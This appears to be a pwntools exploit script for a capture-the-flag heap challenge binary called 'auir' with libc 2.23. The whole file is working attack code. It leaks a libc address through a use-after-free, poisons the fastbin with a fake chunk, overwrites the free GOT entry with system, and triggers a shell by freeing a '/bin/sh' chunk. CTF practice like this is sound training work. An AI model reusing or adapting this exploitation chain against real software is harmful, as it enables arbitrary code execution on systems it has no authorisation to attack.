#!/usr/bin/env python2
from pwn import *
from time import sleep

exe = ELF("./auir")
libc = ELF("./libc-2.23.so")
env = {"LD_PRELOAD":"./libc-2.23.so"}
context.binary = exe
context.terminal = "wt.exe -- wsl.exe -d Ubuntu-20.04 -- ".split()
#context.terminal = "kitty -e sh -c".split()
context.log_level = "debug"

global io
breakpoints = '''
break *0x402dc6
continue
'''+"continue\n"*12

if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path, env=env)
else:
    io = gdb.debug(exe.path, env=env, gdbscript=breakpoints)
    
re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

def MakeZealot(size,data):
    sla(">>", "1")
    sla(">>", str(size))
    sla(">>", data)

def DestroyZealot(index):
    sla(">>", "2")
    sla(">>", str(index))

def FixZealot(index,size,data):
    sla(">>", "3")
    sla(">>", str(index))
    sla(">>", str(size))
    sla(">>", data)

def DisplaySkills(index):
    sla(">>", "4")
    sla(">>", str(index))
    reu("...\n")

fake_chunk = 0x6052ed

MakeZealot(0xf8,"AAAA") #0
MakeZealot(0x18,"BBBB") #1

DestroyZealot(0)
DisplaySkills(0)

libc.address = unpack(re(6),48) - 0x3c4b78
log.info("Libc -> "+hex(libc.address))

MakeZealot(0x68,"CCCC") #2
MakeZealot(0x68,"DDDD") #3
MakeZealot(0x18,"EEEE") #4

DestroyZealot(2)
DestroyZealot(3)

FixZealot(3,0x18,flat([
    fake_chunk,
    0,
    "XXXX"
    ]))

MakeZealot(0x68,"/bin/sh\x00") #5
MakeZealot(0x68,"GGGG") #6

FixZealot(6,0x1b,"Z"*0x13+p64(exe.got["free"]))
FixZealot(0,0x8,p64(libc.symbols["system"]))

DestroyZealot(5)

io.interactive()